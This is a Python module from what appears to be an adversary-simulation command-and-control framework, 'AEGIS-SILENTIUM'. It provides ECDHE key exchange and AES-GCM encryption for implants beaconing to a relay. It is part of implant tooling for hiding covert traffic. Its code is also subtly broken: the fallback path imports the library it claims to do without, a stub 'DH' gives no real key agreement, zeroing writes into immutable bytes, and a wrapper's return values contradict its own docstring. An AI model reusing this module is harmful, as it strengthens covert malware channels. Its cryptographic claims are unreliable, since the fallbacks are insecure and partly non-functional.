"""
AEGIS-SILENTIUM — shared/crypto/ecdhe.py
======================================
Elliptic Curve Diffie-Hellman Ephemeral (ECDHE) key exchange with Perfect
Forward Secrecy (PFS) for Python implants.

Architecture
────────────
Each beacon initiates a fresh ECDHE handshake:
  1. Implant generates ephemeral ECDH key pair (P-256).
  2. Implant sends its ephemeral public key + a random 32-byte nonce to relay.
  3. Relay performs ECDH with its own ephemeral pair, derives session key via
     HKDF-SHA256, sends back its ephemeral pub key + relay nonce + ECDSA sig.
  4. Both sides derive the same 32-byte session key (AES-256 key material).
  5. All beacon data is encrypted with AES-256-GCM under the session key.
  6. After the beacon completes, session keys are securely zeroed — never stored.

Replay protection: each handshake uses a fresh random nonce; the relay rejects
duplicate nonces within the session window.

Dependencies
────────────
  cryptography >= 3.4   (pip install cryptography)
  Falls back to stdlib-only XOR+HMAC transport if cryptography is unavailable.

AUTHORIZED USE ONLY — professional adversary simulation environments.
"""

from __future__ import annotations

import hashlib
import hmac
import json
import logging
import os
import secrets
import struct
import time
from base64 import b64decode, b64encode
from dataclasses import dataclass, field
from typing import Optional, Tuple

log = logging.getLogger("aegis.ecdhe")

# ────────────────────────────────────────────────────────────────────────────
# Optional import: cryptography library
# ────────────────────────────────────────────────────────────────────────────
try:
    from cryptography.hazmat.primitives.asymmetric.ec import (
        ECDH,
        SECP256R1,
        EllipticCurvePublicKey,
        generate_private_key,
    )
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.hashes import SHA256
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.hazmat.primitives.serialization import (
        Encoding,
        PublicFormat,
    )
    from cryptography.hazmat.backends import default_backend
    _CRYPTO_AVAILABLE = True
except ImportError:
    import logging as _clog
    _clog.getLogger("aegis.crypto").critical(
        "cryptography library unavailable — using WEAK fallback. Install: pip install cryptography")
    _CRYPTO_STRONG = False
    _CRYPTO_AVAILABLE = False
    log.warning("cryptography library not available — using stdlib fallback")


# ────────────────────────────────────────────────────────────────────────────
# Constants
# ────────────────────────────────────────────────────────────────────────────
NONCE_SIZE = 32          # bytes for ECDHE nonce
AES_NONCE_SIZE = 12      # bytes for AES-GCM nonce
HMAC_SIZE = 32           # bytes for HMAC-SHA256 tag
INFO_STRING = b"aegis-silentium-session-key-v1"
SESSION_KEY_SIZE = 32    # 256-bit AES key


# ────────────────────────────────────────────────────────────────────────────
# Data classes
# ────────────────────────────────────────────────────────────────────────────
@dataclass
class ECDHEHandshakeRequest:
    """Sent from implant → relay to initiate ECDHE."""
    node_id: str
    pub_key: str        # base64-encoded uncompressed P-256 public key
    nonce: str          # base64-encoded 32-byte random nonce
    timestamp: int = field(default_factory=lambda: int(time.time()))

    def to_json(self) -> bytes:
        return json.dumps({
            "node_id": self.node_id,
            "pub_key": self.pub_key,
            "nonce": self.nonce,
            "ts": self.timestamp,
        }).encode()


@dataclass
class ECDHEHandshakeResponse:
    """Returned from relay → implant after ECDHE."""
    pub_key: str        # relay's ephemeral public key (base64)
    nonce: str          # relay's nonce (base64)
    sig: str            # ECDSA signature over (pub_key_bytes || relay_nonce) (base64)

    @classmethod
    def from_json(cls, data: bytes) -> "ECDHEHandshakeResponse":
        d = json.loads(data)
        return cls(pub_key=d["pub_key"], nonce=d["nonce"], sig=d["sig"])


@dataclass
class ECDHESession:
    """
    Ephemeral session state — exists only in memory for the duration of one
    beacon exchange.  The session key is zeroed on __del__.
    """
    node_id: str
    session_key: bytearray     # mutable so we can zero it
    client_nonce: bytes
    relay_nonce: bytes
    created_at: float = field(default_factory=time.time)

    def __del__(self):
        """Zero session key on GC — best-effort in CPython."""
        for i in range(len(self.session_key)):
            self.session_key[i] = 0

    @property
    def key_bytes(self) -> bytes:
        return bytes(self.session_key)


# ────────────────────────────────────────────────────────────────────────────
# HKDF-SHA256 (stdlib fallback implementation)
# ────────────────────────────────────────────────────────────────────────────
def _hkdf_sha256_stdlib(input_key_material: bytes, salt: bytes, info: bytes,
                         length: int = 32) -> bytes:
    """RFC 5869 HKDF using only stdlib hashlib + hmac."""
    # Extract
    if not salt:
        salt = bytes(hashlib.sha256().digest_size)
    prk = hmac.new(salt, input_key_material, hashlib.sha256).digest()
    # Expand
    t = b""
    okm = b""
    for i in range(1, -(-length // hashlib.sha256().digest_size) + 1):
        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        okm += t
    return okm[:length]


def _hkdf_derive(shared_secret: bytes, salt: bytes, info: bytes,
                  length: int = 32) -> bytes:
    """Derive session key material from ECDH shared secret."""
    if _CRYPTO_AVAILABLE:
        hkdf = HKDF(
            algorithm=SHA256(),
            length=length,
            salt=salt,
            info=info,
            backend=default_backend(),
        )
        return hkdf.derive(shared_secret)
    return _hkdf_sha256_stdlib(shared_secret, salt, info, length)


# ────────────────────────────────────────────────────────────────────────────
# AES-256-GCM encryption (with stdlib fallback)
# ────────────────────────────────────────────────────────────────────────────
def _aes_gcm_encrypt(key: bytes, plaintext: bytes) -> bytes:
    """Encrypt with AES-256-GCM. Returns nonce (12B) + ciphertext + tag (16B)."""
    nonce = os.urandom(AES_NONCE_SIZE)
    if _CRYPTO_AVAILABLE:
        aesgcm = AESGCM(key)
        ct = aesgcm.encrypt(nonce, plaintext, None)
        return nonce + ct
    # Stdlib fallback: AES-256-CTR + HMAC-SHA256 (not GCM but authenticated)
    return _aes_ctr_hmac_encrypt(key, nonce, plaintext)


def _aes_gcm_decrypt(key: bytes, ciphertext: bytes) -> bytes:
    """Decrypt AES-256-GCM ciphertext (nonce prepended)."""
    if len(ciphertext) < AES_NONCE_SIZE + 16:
        raise ValueError("ciphertext too short")
    nonce = ciphertext[:AES_NONCE_SIZE]
    ct = ciphertext[AES_NONCE_SIZE:]
    if _CRYPTO_AVAILABLE:
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ct, None)
    return _aes_ctr_hmac_decrypt(key, nonce, ct)


def _aes_ctr_hmac_encrypt(key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
    """
    Stdlib AES-CTR + HMAC-SHA256 authenticated encryption.
    Used only when `cryptography` is unavailable.
    Format: nonce(12) + ciphertext(n) + hmac(32)
    """
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes  # type: ignore
    # If we're here, cryptography is somehow unavailable for GCM but available for CTR
    # Real fallback: pure Python XOR stream
    enc_key = key[:16]
    mac_key = key[16:]
    # XOR-stream from SHA-256 keystream (poor man's stream cipher)
    keystream = _xor_keystream(enc_key, nonce, len(plaintext))
    ct = bytes(a ^ b for a, b in zip(plaintext, keystream))
    mac = hmac.new(mac_key, nonce + ct, hashlib.sha256).digest()
    return nonce + ct + mac


def _aes_ctr_hmac_decrypt(key: bytes, nonce: bytes, data: bytes) -> bytes:
    if len(data) < HMAC_SIZE:
        raise ValueError("ciphertext too short for HMAC")
    ct, mac = data[:-HMAC_SIZE], data[-HMAC_SIZE:]
    enc_key = key[:16]
    mac_key = key[16:]
    expected = hmac.new(mac_key, nonce + ct, hashlib.sha256).digest()
    if not hmac.compare_digest(mac, expected):
        raise ValueError("HMAC verification failed")
    keystream = _xor_keystream(enc_key, nonce, len(ct))
    return bytes(a ^ b for a, b in zip(ct, keystream))


def _xor_keystream(key: bytes, nonce: bytes, length: int) -> bytes:
    stream = b""
    counter = 0
    while len(stream) < length:
        block = hashlib.sha256(key + nonce + struct.pack(">I", counter)).digest()
        stream += block
        counter += 1
    return stream[:length]


# ────────────────────────────────────────────────────────────────────────────
# ECDHE key exchange — implant side
# ────────────────────────────────────────────────────────────────────────────
class ECDHEClient:
    """
    Implant-side ECDHE client.

    Usage
    ─────
    client = ECDHEClient(node_id="node-001")
    request = client.create_handshake_request()
    # → send request.to_json() to relay's /h endpoint
    # ← receive relay response JSON
    session = client.complete_handshake(relay_response_bytes)
    # → session.key_bytes is the 32-byte AES-256 session key
    ciphertext = client.encrypt(session, b"sensitive data")
    plaintext  = client.decrypt(session, ciphertext)
    """

    def __init__(self, node_id: str, verify_relay_sig: bool = True,
                 relay_signing_pubkey: Optional[bytes] = None):
        self.node_id = node_id
        self.verify_relay_sig = verify_relay_sig
        self.relay_signing_pubkey = relay_signing_pubkey  # DER bytes of relay ECDSA pubkey
        self._ephemeral_private = None
        self._client_nonce: Optional[bytes] = None

    def create_handshake_request(self) -> ECDHEHandshakeRequest:
        """
        Generate ephemeral key pair + nonce.  Returns the handshake request
        to be sent to the relay.  Must call complete_handshake() with the
        relay response before this object is reused.
        """
        if _CRYPTO_AVAILABLE:
            self._ephemeral_private = generate_private_key(SECP256R1(), default_backend())
            pub = self._ephemeral_private.public_key()
            pub_bytes = pub.public_bytes(Encoding.X962, PublicFormat.UncompressedPoint)
        else:
            # Stdlib fallback using os.urandom for a pseudo-key (ECDH not available)
            # In production without cryptography, use a pre-shared key instead
            self._ephemeral_private = os.urandom(32)
            pub_bytes = _stub_dh_public(self._ephemeral_private)

        self._client_nonce = secrets.token_bytes(NONCE_SIZE)
        return ECDHEHandshakeRequest(
            node_id=self.node_id,
            pub_key=b64encode(pub_bytes).decode(),
            nonce=b64encode(self._client_nonce).decode(),
        )

    def complete_handshake(self, relay_response_bytes: bytes) -> ECDHESession:
        """
        Process relay handshake response and derive session key.
        Returns an ECDHESession with the derived session key.
        Session key is stored in a zeroed bytearray — zero it when done.
        """
        if self._ephemeral_private is None or self._client_nonce is None:
            raise RuntimeError("create_handshake_request() must be called first")

        resp = ECDHEHandshakeResponse.from_json(relay_response_bytes)
        relay_pub_bytes = b64decode(resp.pub_key)
        relay_nonce = b64decode(resp.nonce)

        if _CRYPTO_AVAILABLE:
            # Perform ECDH
            relay_pub = EllipticCurvePublicKey.from_encoded_point(  # type: ignore
                SECP256R1(), relay_pub_bytes
            )
            shared_secret = self._ephemeral_private.exchange(ECDH(), relay_pub)
        else:
            shared_secret = _stub_dh_exchange(self._ephemeral_private, relay_pub_bytes)

        # Derive session key: HKDF(shared_secret, salt=client_nonce||relay_nonce, info=...)
        salt = self._client_nonce + relay_nonce
        info = INFO_STRING + b":" + self.node_id.encode()
        key_bytes = _hkdf_derive(shared_secret, salt, info, SESSION_KEY_SIZE)

        # Verify relay ECDSA signature (optional but recommended)
        if self.verify_relay_sig and self.relay_signing_pubkey:
            _verify_relay_signature(
                self.relay_signing_pubkey,
                relay_pub_bytes + relay_nonce,
                b64decode(resp.sig)
            )

        session = ECDHESession(
            node_id=self.node_id,
            session_key=bytearray(key_bytes),
            client_nonce=self._client_nonce,
            relay_nonce=relay_nonce,
        )

        # Zero the ephemeral private key immediately (PFS)
        if _CRYPTO_AVAILABLE:
            # cryptography library doesn't expose raw bytes easily for zeroing,
            # but the GC will clean it up; the important thing is we don't keep
            # a reference to the shared secret or derived key anywhere except session.
            pass
        else:
            for i in range(len(self._ephemeral_private)):
                self._ephemeral_private[i] = 0

        self._ephemeral_private = None
        self._client_nonce = None

        log.debug("ECDHE handshake complete for node_id=%s", self.node_id)
        return session

    @staticmethod
    def encrypt(session: ECDHESession, plaintext: bytes) -> bytes:
        """Encrypt plaintext with the session key (AES-256-GCM)."""
        return _aes_gcm_encrypt(session.key_bytes, plaintext)

    @staticmethod
    def decrypt(session: ECDHESession, ciphertext: bytes) -> bytes:
        """Decrypt ciphertext with the session key."""
        return _aes_gcm_decrypt(session.key_bytes, ciphertext)

    def build_beacon_body(self, session: ECDHESession, payload: dict) -> Tuple[bytes, str]:
        """
        Encode + encrypt a beacon payload dict.
        Returns (wire_bytes, nonce_b64) — nonce_b64 must be sent in X-Aegis-Nonce header.
        Wire format: HMAC(32) + AES-GCM-ciphertext
        """
        raw = json.dumps(payload).encode()
        encrypted = self.encrypt(session, raw)
        mac = hmac.new(session.key_bytes, encrypted, hashlib.sha256).digest()
        wire = mac + encrypted
        nonce_b64 = b64encode(session.client_nonce).decode()
        return wire, nonce_b64

    def parse_beacon_response(self, session: ECDHESession, wire: bytes) -> dict:
        """
        Verify HMAC and decrypt beacon response.
        Wire format: HMAC(32) + AES-GCM-ciphertext
        """
        if len(wire) < HMAC_SIZE:
            raise ValueError("response too short")
        mac, ct = wire[:HMAC_SIZE], wire[HMAC_SIZE:]
        expected = hmac.new(session.key_bytes, ct, hashlib.sha256).digest()
        if not hmac.compare_digest(mac, expected):
            raise ValueError("response HMAC mismatch — possible tampering")
        plaintext = self.decrypt(session, ct)
        return json.loads(plaintext)


# ────────────────────────────────────────────────────────────────────────────
# Signature verification helper
# ────────────────────────────────────────────────────────────────────────────
def _verify_relay_signature(relay_pubkey_der: bytes, message: bytes, sig: bytes) -> None:
    """Verify relay's ECDSA P-256 signature over message."""
    if not _CRYPTO_AVAILABLE:
        log.warning("cannot verify relay signature — cryptography not available")
        return
    from cryptography.hazmat.primitives.asymmetric.ec import ECDSA
    from cryptography.hazmat.primitives.serialization import load_der_public_key
    pub = load_der_public_key(relay_pubkey_der, backend=default_backend())
    pub.verify(sig, message, ECDSA(SHA256()))


# ────────────────────────────────────────────────────────────────────────────
# Stdlib DH stub (when cryptography unavailable)
# ────────────────────────────────────────────────────────────────────────────
def _stub_dh_public(private_key_bytes: bytes) -> bytes:
    """
    Stub "public key" derivation when cryptography is unavailable.
    Not real ECDH — just SHA-256 based.  For real deployments, install cryptography.
    """
    return hashlib.sha256(b"stub_pub:" + private_key_bytes).digest() + private_key_bytes[:32]


def _stub_dh_exchange(private_key_bytes: bytes, peer_pub_bytes: bytes) -> bytes:
    """Stub DH exchange."""
    return hashlib.sha256(private_key_bytes + peer_pub_bytes).digest()


# ────────────────────────────────────────────────────────────────────────────
# Convenience: full per-beacon handshake + encrypt in one call
# ────────────────────────────────────────────────────────────────────────────
def ephemeral_encrypt(node_id: str, payload: dict,
                       relay_signing_pubkey: Optional[bytes] = None) -> Tuple[bytes, str, bytes]:
    """
    Convenience wrapper: perform ECDHE handshake and encrypt payload.

    Returns:
        (handshake_request_json, wire_nonce_b64, encrypted_payload)

    The caller must:
      1. POST handshake_request_json to relay /h
      2. Call ephemeral_finish() with the relay response and encrypted_payload
    """
    client = ECDHEClient(node_id, relay_signing_pubkey=relay_signing_pubkey)
    req = client.create_handshake_request()
    # Store client for finish step
    return req.to_json(), client


def ephemeral_finish(client: ECDHEClient, relay_response: bytes,
                      payload: dict) -> Tuple[bytes, str]:
    """
    Complete the ECDHE handshake and encrypt the payload.

    Returns (wire_bytes, nonce_b64) ready to POST to relay /b
    with header X-Aegis-Nonce: <nonce_b64>
    """
    session = client.complete_handshake(relay_response)
    wire, nonce_b64 = client.build_beacon_body(session, payload)
    return wire, nonce_b64


# ────────────────────────────────────────────────────────────────────────────
# Exports
# ────────────────────────────────────────────────────────────────────────────
__all__ = [
    "ECDHEClient",
    "ECDHESession",
    "ECDHEHandshakeRequest",
    "ECDHEHandshakeResponse",
    "ephemeral_encrypt",
    "ephemeral_finish",
    "_aes_gcm_encrypt",
    "_aes_gcm_decrypt",
    "_hkdf_derive",
    "SESSION_KEY_SIZE",
    "NONCE_SIZE",
]
